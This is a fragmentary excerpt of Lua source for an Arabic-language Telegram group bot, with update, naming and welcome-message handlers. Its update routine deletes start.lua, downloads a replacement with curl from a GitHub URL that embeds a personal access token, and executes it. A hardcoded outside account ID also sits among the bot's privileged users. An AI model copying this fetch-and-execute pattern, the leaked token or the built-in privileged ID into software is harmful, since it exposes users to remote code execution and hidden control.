...
----------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------
namebot = redis:get(bot_id..":namebot") or " الكبير"
SudosS = {5264819429}
Sudos = {sudoid,5264819429}
----------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------
function Bot(msg)  
local idbot = false  
...
type = 'inline',
data = {
{{text = '𝘢𝘭𝘬𝘢𝘣𝘪𝘳 𝘵𝘦𝘢𝘮 † . ',url="t.me/DD7IX"}},
}
}
...
{{text = '- تغيير اسم البوت .',data="namebot"},{text =(redis:get(bot_id..":namebot") or "الكبير"),data="delnamebot"}},
...
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '- لـ تنصيب البوتات .',url="https://t.me/uqq7x"}},
...
os.execute('rm -rf start.lua')
os.execute('curl -s https://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@raw.githubusercontent.com/timalkabir/u/main/start.lua -o start.lua')
dofile('start.lua')  
end
end 
if text == "تحديث" then
...
name = string.gsub(name,"هادئ","الكبيري")
...
namet = {"اسمي "..(redis:get(bot_id..":namebot") or "الكبير"),"عمريي اسمي "..(redis:get(bot_id..":namebot") or "الكبير"),"اني لقميل "..(redis:get(bot_id..":namebot") or "الكبير"),(redis:get(bot_id..":namebot") or "الكبير").." اني"}
bot.sendText(msg.chat_id,msg.id,"*"..namet[math.random(#namet)].."*","md",true)  
end
if text == "بوت" or text == (redis:get(bot_id..":namebot") or "الكبير") then
...
local UserId_Info = bot.searchPublicChat("uqq7x")
if UserId_Info.id then
...
{{text = '- 𝖲??𝗎𝖱??𝖾 𝖾𝗂𝗅𝖺𝗇𝖣 .',url="t.me/DD7IX"}},
}
}
...
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '𝘢𝘭𝘬𝘢𝘣𝘪𝘳 𝘵𝘦𝘢𝘮 † . ',url="https://t.me/DD7IX"}},
}
}
...
local Text = "*- 𝘞𝘌𝘓𝘤𝘰𝘮𝘦 𝘵𝘰 𝘢𝘭𝘬𝘢𝘣𝘪𝘳 𝘵𝘦𝘢𝘮  .*\n"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '-  𝘢𝘭𝘬𝘢𝘣𝘪𝘳 𝘵𝘦𝘢𝘮 .',url="https://t.me/DD7IX"}},
{{text = '- 𝘪𝘯𝘧𝘰 𝘢𝘭𝘬𝘢𝘣𝘪𝘳 .',url="https://t.me/HJJDX"}},
{{text = '- 𝘋𝘌𝘷𝘦𝘭𝘰𝘱𝘦𝘳 .',url="https://t.me/uqq7x"}},
}
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg.chat_id .. "&photo=https://t.me/DD7IX&caption=".. URL.escape(Text).."&photo=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
----------------------------------------------------------------------------------------------------
if text == 'تفعيل' then
if msg.can_be_deleted_for_all_users == false then
